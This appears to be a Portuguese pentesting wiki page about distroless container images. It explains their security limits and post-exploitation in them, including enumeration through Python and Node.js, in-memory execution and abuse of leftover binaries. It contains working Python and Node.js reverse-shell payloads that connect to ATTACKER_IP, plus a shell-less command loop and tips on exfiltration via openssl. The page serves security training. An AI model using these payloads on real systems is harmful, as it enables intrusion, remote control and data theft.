# Containers Distroless

{{#include ../../../banners/hacktricks-training.md}}

## Visão geral

Uma imagem de container **distroless** é uma imagem que inclui os **componentes mínimos de runtime necessários para executar uma aplicação específica**, removendo intencionalmente as ferramentas comuns da distribuição, como package managers, shells e grandes conjuntos de utilitários genéricos de userland. Na prática, imagens distroless geralmente contêm apenas o binário ou runtime da aplicação, suas bibliotecas compartilhadas, bundles de certificados e um layout de filesystem muito pequeno.

A ideia não é que distroless seja uma nova primitiva de isolamento do kernel. Distroless é uma **estratégia de design de imagem**. Ela altera o que está disponível **dentro** do filesystem do container, não a forma como o kernel isola o container. Essa distinção é importante, porque distroless fortalece o ambiente principalmente reduzindo o que um atacante pode usar após obter code execution. Ela não substitui namespaces, seccomp, capabilities, AppArmor, SELinux ou qualquer outro mecanismo de isolamento em runtime.

## Por Que Distroless Existe

Imagens distroless são usadas principalmente para reduzir:

- o tamanho da imagem
- a complexidade operacional da imagem
- o número de packages e binários que poderiam conter vulnerabilidades
- o número de ferramentas de post-exploitation disponíveis para um atacante por padrão

É por isso que imagens distroless são populares em deployments de aplicações em produção. Um container que não contém shell, package manager e quase nenhuma ferramenta genérica geralmente é mais fácil de analisar operacionalmente e mais difícil de abusar de forma interativa após um compromise.

Exemplos de famílias conhecidas de imagens no estilo distroless incluem:

- imagens distroless do Google
- imagens hardened/minimal da Chainguard

## O Que Distroless Não Significa

Um container distroless **não é**:

- automaticamente rootless
- automaticamente non-privileged
- automaticamente read-only
- automaticamente protegido por seccomp, AppArmor ou SELinux
- automaticamente seguro contra container escape

Ainda é possível executar uma imagem distroless com `--privileged`, compartilhamento de host namespaces, bind mounts perigosos ou um runtime socket montado. Nesse cenário, a imagem pode ser minimalista, mas o container ainda pode estar catastroficamente inseguro. Distroless altera a **superfície de ataque do userland**, não a **fronteira de confiança do kernel**.

## Características Operacionais Típicas

Quando você compromete um container distroless, a primeira coisa que normalmente percebe é que as suposições comuns deixam de ser verdadeiras. Pode não haver `sh`, `bash`, `ls`, `id`, `cat` e, às vezes, nem mesmo um ambiente baseado em libc que se comporte da forma esperada pelo seu tradecraft habitual. Isso afeta tanto o offense quanto o defense, porque a falta de ferramentas torna debugging, incident response e post-exploitation diferentes.

Os padrões mais comuns são:

- o application runtime existe, mas quase nada além dele
- payloads baseados em shell falham porque não há shell
- one-liners comuns de enumeration falham porque os helper binaries estão ausentes
- proteções do filesystem, como read-only rootfs ou `noexec` em locais graváveis de tmpfs, também costumam estar presentes

Essa combinação é o que normalmente leva as pessoas a falar em "weaponizing distroless".

## Distroless E Post-Exploitation

O principal desafio ofensivo em um ambiente distroless nem sempre é o RCE inicial. Muitas vezes, é o que vem depois. Se o workload explorado fornecer code execution em um language runtime, como Python, Node.js, Java ou Go, talvez seja possível executar lógica arbitrária, mas não por meio dos workflows normais centrados em shell que são comuns em outros alvos Linux.

Isso significa que post-exploitation frequentemente segue uma destas três direções:

1. **Usar diretamente o language runtime existente** para enumerar o ambiente, abrir sockets, ler arquivos ou preparar payloads adicionais.
2. **Trazer suas próprias ferramentas para a memória** se o filesystem for read-only ou se os locais graváveis estiverem montados com `noexec`.
3. **Abusar de binários existentes na imagem** se a aplicação ou suas dependências incluírem algo inesperadamente útil.

## Abuso

### Enumerar O Runtime Que Você Já Possui

Em muitos containers distroless não há shell, mas ainda existe um application runtime. Se o alvo for um serviço Python, Python está presente. Se o alvo for Node.js, Node está presente. Isso frequentemente fornece funcionalidade suficiente para enumerar arquivos, ler variáveis de ambiente, abrir reverse shells e preparar execução em memória sem nunca invocar `/bin/sh`.

Um exemplo simples com Python:
```bash
python3 - <<'PY'
import os, socket, subprocess
print("uid", os.getuid())
print("cwd", os.getcwd())
print("env keys", list(os.environ)[:20])
print("root files", os.listdir("/")[:30])
PY
```
Um exemplo simples com Node.js:
```bash
node -e 'const fs=require("fs"); console.log(process.getuid && process.getuid()); console.log(fs.readdirSync("/").slice(0,30)); console.log(Object.keys(process.env).slice(0,20));'
```
Impacto:

- recuperação de variáveis de ambiente, frequentemente incluindo credenciais ou endpoints de serviço
- enumeração do filesystem sem `/bin/ls`
- identificação de caminhos graváveis e secrets montados

### Reverse Shell Without `/bin/sh`

Se a imagem não contiver `sh` ou `bash`, um reverse shell clássico baseado em shell poderá falhar imediatamente. Nesse caso, use o runtime de linguagem instalado.

Python reverse shell:
```bash
python3 - <<'PY'
import os,pty,socket
s=socket.socket()
s.connect(("ATTACKER_IP",4444))
for fd in (0,1,2):
os.dup2(s.fileno(),fd)
pty.spawn("/bin/sh")
PY
```
Se `/bin/sh` não existir, substitua a linha final por uma execução direta de comandos conduzida por Python ou por um loop de REPL do Python.

Node reverse shell:
```bash
node -e 'var net=require("net"),cp=require("child_process");var s=net.connect(4444,"ATTACKER_IP",function(){var p=cp.spawn("/bin/sh",[]);s.pipe(p.stdin);p.stdout.pipe(s);p.stderr.pipe(s);});'
```
Novamente, se `/bin/sh` estiver ausente, use diretamente as APIs de filesystem, processos e networking do Node em vez de iniciar um shell.

### Exemplo completo: No-Shell Python Command Loop

Se a imagem tiver Python, mas nenhum shell, um loop interativo simples geralmente é suficiente para manter a capacidade completa de post-exploitation:
```bash
python3 - <<'PY'
import os,subprocess
while True:
cmd=input("py> ")
if cmd.strip() in ("exit","quit"):
break
p=subprocess.run(cmd, shell=True, capture_output=True, text=True)
print(p.stdout, end="")
print(p.stderr, end="")
PY
```
Isso não requer um binário de shell interativo. O impacto é efetivamente o mesmo que o de um shell básico do ponto de vista do atacante: execução de comandos, enumeração e staging de payloads adicionais por meio do runtime existente.

### Execução de Ferramentas em Memória

Imagens Distroless são frequentemente combinadas com:

- `readOnlyRootFilesystem: true`
- tmpfs gravável, mas `noexec`, como `/dev/shm`
- ausência de ferramentas de gerenciamento de pacotes

Essa combinação torna pouco confiáveis os workflows clássicos de "baixar um binário para o disco e executá-lo". Nesses casos, técnicas de execução em memória tornam-se a principal alternativa.

A página dedicada a isso é:

{{#ref}}
../../linux-basics/bypass-linux-restrictions/bypass-fs-protections-read-only-no-exec-distroless/
{{#endref}}

As técnicas mais relevantes são:

- `memfd_create` + `execve` via runtimes de scripting
- DDexec / EverythingExec
- memexec
- memdlopen

### Binários Existentes Já Presentes na Imagem

Algumas imagens Distroless ainda contêm binários operacionalmente necessários que se tornam úteis após o compromise. Um exemplo observado repetidamente é o `openssl`, pois as aplicações às vezes precisam dele para tarefas relacionadas a criptografia ou TLS.

Um padrão de busca rápido é:
```bash
find / -type f \( -name openssl -o -name busybox -o -name wget -o -name curl \) 2>/dev/null
```
Se `openssl` estiver presente, ele poderá ser usado para:

- conexões TLS de saída
- exfiltration de dados por um canal de egress permitido
- staging de dados de payload por meio de blobs codificados/criptografados

O abuso exato depende do que está realmente instalado, mas a ideia geral é que distroless não significa "nenhuma ferramenta"; significa "muito menos ferramentas do que uma imagem de distribuição normal".

## Verificações

O objetivo dessas verificações é determinar se a imagem é realmente distroless na prática e quais binários de runtime ou auxiliares ainda estão disponíveis para post-exploitation.
```bash
find / -maxdepth 2 -type f 2>/dev/null | head -n 100          # Very small rootfs is common in distroless images
which sh bash ash busybox python python3 node java 2>/dev/null   # Identify which runtime or shell primitives exist
cat /etc/os-release 2>/dev/null                                # Often missing or minimal
mount | grep -E ' /( |$)|/dev/shm'                             # Check for read-only rootfs and writable tmpfs
```
O que é interessante aqui:

- Se não existir nenhum shell, mas houver um runtime como Python ou Node, o post-exploitation deve mudar para uma execução orientada por runtime.
- Se o root filesystem for somente leitura e `/dev/shm` tiver permissão de escrita, mas estiver `noexec`, as técnicas de execução em memória se tornam muito mais relevantes.
- Se existirem helper binaries como `openssl`, `busybox` ou `java`, eles podem oferecer funcionalidade suficiente para iniciar um acesso adicional.

## Padrões de Runtime

| Estilo de imagem / plataforma | Estado padrão | Comportamento típico | Enfraquecimento manual comum |
| --- | --- | --- | --- |
| Imagens no estilo Google distroless | Userland mínimo por design | Sem shell, sem gerenciador de pacotes, apenas dependências da aplicação/runtime | adicionar camadas de debugging, shells sidecar, copiar busybox ou ferramentas |
| Imagens mínimas da Chainguard | Userland mínimo por design | Superfície de pacotes reduzida, geralmente focada em um runtime ou serviço | usar variantes `:latest-dev` ou de debug, copiar ferramentas durante o build |
| Workloads do Kubernetes usando imagens distroless | Depende da configuração do Pod | Distroless afeta apenas o userland; a postura de segurança do Pod ainda depende da especificação do Pod e dos padrões do runtime | adicionar debug containers efêmeros, host mounts, configurações de Pod privilegiadas |
| Docker / Podman executando imagens distroless | Depende das run flags | Filesystem mínimo, mas a segurança do runtime ainda depende das flags e da configuração do daemon | `--privileged`, compartilhamento de namespaces do host, mounts de sockets do runtime, host binds com permissão de escrita |

O ponto principal é que distroless é uma **propriedade da imagem**, não uma proteção do runtime. Seu valor vem da redução do que está disponível dentro do filesystem após um compromise.

## Páginas relacionadas

Para bypasses de filesystem e execução em memória normalmente necessários em ambientes distroless:

{{#ref}}
../../linux-basics/bypass-linux-restrictions/bypass-fs-protections-read-only-no-exec-distroless/
{{#endref}}

Para abusos de runtime de containers, sockets e mounts que ainda se aplicam a workloads distroless:

{{#ref}}
runtime-api-and-daemon-exposure.md
{{#endref}}

{{#ref}}
sensitive-host-mounts.md
{{#endref}}

{{#include ../../../banners/hacktricks-training.md}}
